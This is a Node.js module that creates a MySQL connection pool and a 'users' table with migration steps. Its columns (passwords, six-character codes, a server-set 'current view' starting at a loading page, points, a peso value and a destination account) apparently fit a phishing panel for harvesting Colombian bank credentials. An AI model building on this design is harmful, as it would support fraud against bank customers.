const mysql = require('mysql2/promise');

const connectionConfig = process.env.MYSQL_URL || {
  host: process.env.MYSQL_HOST || 'localhost',
  port: Number(process.env.MYSQL_PORT || 3306),
  user: process.env.MYSQL_USER,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE,
  ssl: process.env.MYSQL_SSL === 'true' ? {} : undefined,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
};

const pool = mysql.createPool(connectionConfig);

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id INT UNSIGNED NOT NULL AUTO_INCREMENT,
      username VARCHAR(191) NOT NULL,
      password VARCHAR(255) NOT NULL,
      apartment_code VARCHAR(6) NULL,
      keyword_code VARCHAR(255) NULL,
      current_view VARCHAR(255) NOT NULL DEFAULT 'cargando.html',
      puntos VARCHAR(50) NULL,
      valor_cop VARCHAR(50) NULL,
      cuenta_destino VARCHAR(255) NULL,
      PRIMARY KEY (id),
      UNIQUE KEY users_username_unique (username)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  `);

  // Migraciones: agregar columnas si no existen (para bases de datos ya creadas)
  const migrations = [
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS puntos VARCHAR(50) NULL",
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS valor_cop VARCHAR(50) NULL",
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS cuenta_destino VARCHAR(255) NULL",
  ];
  for (const sql of migrations) {
    try { await pool.query(sql); } catch (_) { /* columna ya existe */ }
  }
}

module.exports = { pool, initDb };
